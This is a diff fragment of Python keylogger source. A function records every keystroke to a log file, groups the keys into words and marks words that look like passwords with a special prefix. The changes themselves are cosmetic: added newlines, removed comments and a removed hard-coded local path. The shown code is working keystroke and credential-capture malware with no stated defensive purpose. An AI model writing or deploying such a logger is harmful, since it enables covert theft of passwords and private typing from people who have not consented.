@@ -62,46 +62,38 @@ def keyPressed(key, file_path):
         except Exception as e:
             print("Error:", e)
 
-#writes to file
 def keyPressedF(key, file_path):
     global word
     
-    #file_path = "C:/Users/imclp/OneDrive/Desktop/projects/kyg/log.txt"
-    
-    with open(file_path,'a') as log_file:
+    with open(file_path, 'a') as log_file:
         try:
             if hasattr(key, 'char'):  # Regular character
                 word += key.char
 
             elif key == keyboard.Key.space:  # Space key
-                log_file.write(word + " ")  # Add the current word to the buffer
+                log_file.write(word + " " + "\n")  # Add the current word to the buffer
                 word = ""  # Reset the word
 
             elif key == keyboard.Key.enter:  # Enter key
                 if check_pass(word):
-                    word = "¿" + word  # Mark password-like words
-                log_file.write(word)
+                    word = "\u00BF" + word  # Mark password-like words
+                log_file.write(word + "\n")
                 word = ""  # Reset the word
 
             elif key == keyboard.Key.backspace:  # Backspace key
-                # Remove the last character from the current word, if any
-                word = word[:-1]
+                word = word[:-1]  # Remove the last character from the current word
 
             elif key == keyboard.Key.delete:  # Delete key
-                # Optional: Handle delete key, e.g., log a delete event
-                log_file.write("[DELETE]")
+                log_file.write("[DELETE]\n")
 
             elif key in (keyboard.Key.alt, keyboard.Key.tab):  # Alt or Tab keys
-                log_file.write(f"[{key.name.upper()}]")  # Log the special key press
+                log_file.write(f"[{key.name.upper()}]\n")  # Log the special key press
 
             elif key in (keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.cmd):  # Modifier keys
-                # Optionally log modifier key presses
-                log_file.write(f"[{key.name.upper()}]")
+                log_file.write(f"[{key.name.upper()}]\n")
 
             else:
-                # Log any unhandled special key presses
-                log_file.write(f"[{key}]")
-
+                log_file.write(f"[{key}]\n")  # Log any unhandled special key presses
         except Exception as e:
             print("Error:", e)
 
